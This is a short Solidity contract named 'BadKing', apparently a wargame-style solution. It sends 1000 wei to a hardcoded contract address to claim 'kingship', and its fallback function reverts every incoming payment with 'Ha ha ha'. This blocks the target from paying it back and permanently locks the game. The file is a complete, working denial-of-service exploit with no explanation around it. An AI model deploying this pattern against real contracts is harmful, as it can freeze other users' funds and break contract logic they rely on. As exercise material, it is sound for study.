// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

contract BadKing {
    address addrContr = 0x80447549d36dC027657DFfF661a8823754473CfD;
    function sendETH() public payable {
    }

    function becomeKing () public {
        (bool success,  ) = address(addrContr).call{gas: 4000000, value: 1000}("");
    }

    fallback() external payable {
        revert("Ha ha ha");
    }

}
  
